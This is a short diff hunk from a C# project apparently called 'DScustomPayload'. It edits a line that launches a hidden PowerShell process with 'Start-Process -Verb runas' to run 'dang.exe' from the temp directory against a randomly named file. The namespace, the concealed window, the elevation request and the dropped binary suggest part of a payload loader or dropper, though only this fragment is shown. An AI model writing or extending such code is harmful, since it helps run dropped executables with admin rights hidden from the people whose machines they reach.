@@ -364,7 +364,7 @@ namespace DScustomPayload
 			
 			ProcessStartInfo processInfo;
 			Process process;
-			processInfo = new ProcessStartInfo("powershell.exe", @"Start-Process -Verb runas -FilePath '%temp%\dang.exe' -ArgumentList '%temp%\ptrgzksfeqfesgse.dang'");
+			processInfo = new ProcessStartInfo("powershell.exe", @"Start-Process -Verb runas -FilePath '"+tempdir+"\dang.exe' -ArgumentList '"+tempdir+"\ptrgzksfeqfesgse.dang'");
 			processInfo.CreateNoWindow = true;
 			processInfo.UseShellExecute = false;
 			//processInfo.Verb = "runas";
